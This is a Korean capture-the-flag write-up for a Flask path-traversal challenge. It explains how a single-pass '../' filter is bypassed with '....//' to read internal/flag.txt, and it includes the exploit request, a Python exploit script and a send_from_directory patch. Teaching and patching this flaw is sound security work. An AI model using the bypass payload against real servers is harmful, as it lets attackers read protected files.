# easy-05 gift — 경로 조작 파일 읽기 (Path Traversal)

> 출제:  종성 · 분류: Web · 난이도: Easy

---

## 1. 문제 개요

| 항목 | 내용 |
|---|---|
| 분류 | Web |
| 난이도 | Easy |
| 접속 | `http://<출제조IP>:8008` |
| 인증 | 불필요 (로그인 없이 접근 가능) |
| 플래그 형식 | `GlassHouse{...}` |
| 최종 목표 | 공개 보관함(`uploads/`) 바깥에 숨겨진 `internal/flag.txt`의 내용을 읽어낸다 |

파티 초대권 신청 시스템에 신청자용 안내 자료 보관함이 열려 있다. `/download` 로 보관함에 올라온 파일을 내려받을 수 있는데, 서버는 보관함 바깥에 따로 파일 하나를 두고 있다. 그 파일이 플래그다.

---

## 2. 취약점의 원인과 성립 조건

### 처음 보이는 동작

로그인 없이 접근해보면 안내 자료를 내려받는 주소가 이런 모양이다.

```
GET /download?file=이정욱_확인서류.txt
```

`file` 파라미터에 파일 이름을 그대로 적어서 보내면 그 파일이 내려온다. 사용자가 적은 문자열이 곧 서버가 열 파일을 정한다는 뜻이고, 여기서부터 의심이 시작된다.

### 서버가 파일을 두는 구조

`app.py` 를 보면 서버는 시작할 때 두 개의 폴더를 만든다.

```python
UPLOAD_DIR   = os.path.join(BASE_DIR, "uploads")    # 공개 보관함
INTERNAL_DIR = os.path.join(BASE_DIR, "internal")   # 바깥 보관함

# 공개 안내 파일들은 uploads/ 에
# 플래그는 internal/flag.txt 에
with open(os.path.join(INTERNAL_DIR, "flag.txt"), "w") as f:
    f.write(flag("FLAG_GIFT"))
```

`uploads/` 와 `internal/` 은 같은 상위 폴더(`BASE_DIR`) 바로 아래 나란히 있는 형제 디렉토리다. 이 위치 관계가 풀이의 핵심이 된다. 보관함에서 한 칸만 위로 올라가면 바로 옆에 `internal/` 이 있다.

### 취약한 코드

문제의 전부는 `routes/apply.py` 의 다운로드 라우트 한 곳이다.

```python
@bp.get("/download")
def download():
    filename = request.args.get("file", "")
    filename = filename.replace("../", "")     # ← 막는다고 넣은 필터
    target = os.path.join(UPLOAD_DIR, filename)
    if not os.path.isfile(target):
        abort(404)
    return send_file(target)
```

세 줄만 따라가면 된다. 사용자가 준 `filename` 에서 `../` 를 지우고, `uploads/` 뒤에 그대로 이어 붙여서, 그 경로의 파일을 `send_file` 로 돌려준다.

### 왜 뚫리는가 — 원인

여기서 상위 폴더로 올라가는 수단은 `../` 다. (`..` 는 "한 칸 위" 를 뜻하는 경로 기호다.) 출제자는 그걸 알고 `replace("../", "")` 로 `../` 를 지워 막으려 했다. 하지만 이 필터에는 두 가지 구조적 약점이 있다.

1. 블랙리스트 방식이다. "나쁜 글자를 지운다"는 접근은, 지우고 난 뒤에 나쁜 글자가 다시 생기는 경우를 막지 못한다. `str.replace` 는 문자열을 한 번 훑으며 `../` 를 지울 뿐, 지운 결과를 다시 검사하지 않는다.
2. 그래서 `../` 를 재조립할 수 있다. `....//`(점 4개 + 슬래시 2개)를 넣으면, `str.replace` 는 가운데의 `../`(세 번째·네 번째 점과 첫 번째 `/`)를 지운다. 그러면 앞에 남은 두 점 `..` 뒤에 마지막 `/` 가 달라붙어 다시 `../` 가 완성된다.

실제로 필터 동작을 그대로 재현해 확인하면 이렇다.

```
'....//internal/flag.txt'  ->  '../internal/flag.txt'
```

즉, 필터를 통과한 뒤의 최종 경로는 `uploads/../internal/flag.txt` → 정리하면 `internal/flag.txt` 가 되어, 보관함을 빠져나가 플래그 파일에 가 닿는다.

### 성립 조건 정리

- 사용자 입력(`file`)이 서버가 열 파일 경로로 직결된다.
- 파일 접근을 `uploads/` 안으로 가두는 방어 장치가 `../` 를 지우는 블랙리스트 하나뿐이라, 지운 뒤 `../` 가 되살아나는 입력(`....//`)을 걸러내지 못한다.
- `send_file` 은 넘겨준 경로를 그대로 열어주며, 그 경로가 `uploads/` 안인지 다시 확인하지 않는다.
- 이 라우트에는 인증 검사가 없어 누구나 호출할 수 있다.

> 참고: `os.path.join(UPLOAD_DIR, filename)` 자체도 위험을 하나 더 품고 있다. 두 번째 인자가 `/app/internal/flag.txt` 처럼 절대경로면, `os.path.join` 은 앞의 `UPLOAD_DIR` 을 통째로 버리고 절대경로를 그대로 쓴다. 서버 내부 절대경로를 안다면 `../` 없이도 탈출이 가능하다는 뜻이다. "입력을 경로에 그대로 이어 붙인다"는 설계 자체가 문제의 뿌리다.

---

## 3. 풀이

### 단서에서 payload까지

풀이의 논리는 짧고 분명하다.

1. 목표 파일은 `internal/flag.txt`, 다운로드가 열리는 기준 폴더는 `uploads/`. 둘은 형제이므로 위로 한 칸(`../`) 올라가 `internal/` 로 들어가면 된다. 필요한 traversal은 `../` 딱 한 번이다.
2. 그냥 `../internal/flag.txt` 를 보내면 필터가 `../` 를 지워 `internal/flag.txt` 가 되고, 이 경로는 `uploads/internal/flag.txt` 를 가리켜 존재하지 않으니 404 가 난다.
3. 그래서 필터를 통과하고도 `../` 가 살아남도록 `....//` 로 감싼다. 앞서 확인했듯 `....//` → `../` 로 복원된다.

### 최종 공격

```
GET /download?file=....//internal/flag.txt
```

로그인 쿠키도 필요 없다. 이 요청 하나면 서버는 `internal/flag.txt` 를 그대로 응답 본문에 실어 보낸다.

### 성공 판별 기준

- 응답 코드가 200 이고,
- 본문이 안내 파일의 문구(`"... 님이 제출한 확인서류입니다."`)가 아니라 `GlassHouse{` 로 시작하면 성공이다.

성공 시 응답 본문은 다음 형태가 된다. (대괄호 안은 서버 실행 시 출력되는 실제 값)

```
GlassHouse{[실제 플래그 값]}
```

---

## 4. 패치 방안과 검증

### 왜 기존 방식이 틀렸나

근본 원인은 "나쁜 패턴을 지운다"는 블랙리스트 발상이다. 블랙리스트는 공격 문자열의 모든 변형(`....//`, 인코딩, 절대경로 등)을 사람이 미리 다 떠올려야 하는데, 그건 사실상 불가능하다. 올바른 방향은 반대로 "안전한 범위 안인지만 허용" 하는 것이다.

### 권장 패치 — `send_from_directory`

Flask가 제공하는 `send_from_directory` 는 내부적으로 `safe_join` 을 써서 경로가 지정 폴더를 벗어나면 스스로 거부한다. 필터를 직접 짤 필요가 없다.

```python
# 상단 flask import 줄에 send_from_directory 를 끼워 넣는다
from flask import send_from_directory

@bp.get("/download")
def download():
    filename = request.args.get("file", "")
    return send_from_directory(UPLOAD_DIR, filename)
```

보강한다면, 애초에 내려받을 수 있는 파일 목록(화이트리스트)을 두고 그 안에 있는 이름만 허용하면 더 확실하다.

### 검증

- 우회 차단 확인: 패치 후 `GET /download?file=....//internal/flag.txt` 요청 → `uploads/` 바깥으로 나가는 경로이므로 `404`(또는 거부)가 떠야 한다. 플래그가 더는 내려오지 않는다.
- 정상 동작 확인: `GET /download?file=이정욱_확인서류.txt` 요청 → 기존처럼 `200` 과 함께 안내 파일이 정상적으로 내려와야 한다.

이 둘을 모두 만족해야 "막으면서 기능은 유지" 한 올바른 패치다.

---

## 5. 익스플로잇 코드

### 공격의 본체

취약점을 실제로 찌르는 것은 요청 하나다. `....//` 가 필터(`replace("../","")`)를 통과하면서 `../` 로 복원되는 것이 전부다.

```
GET /download?file=....//internal/flag.txt
```

브라우저 주소창에 넣어도 되고, 스크립트로는 아래처럼 보낸다.

```python
#!/usr/bin/env python3
# easy-05 (안내 자료 보관함 / Path Traversal) - "....//" 로 필터를 우회해 internal/flag.txt 읽기
# 사용: python3 exploit.py http://<IP>:8008
import re
import sys
import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:8008"

# 1) 필터가 "../" 를 한 번만 지우므로 "....//" 는 지워진 뒤 "../" 로 남는다
r = requests.get(f"{BASE}/download", params={"file": "....//internal/flag.txt"})
print(f"[*] /download?file=....//internal/flag.txt -> {r.status_code}")

# 2) 응답 본문이 flag.txt 내용 그대로다
m = re.search(r"GlassHouse\{[^}]*\}", r.text)
print(f"[+] FLAG: {m.group(0)}" if m else "[-] 실패")
```

실행 예시

```bash
$ python3 exploit.py http://127.0.0.1:8008
[*] /download?file=....//internal/flag.txt -> 200
[+] FLAG: GlassHouse{...}
```

성공하면 응답 본문에 `GlassHouse{...}` 플래그가 그대로 실려 온다.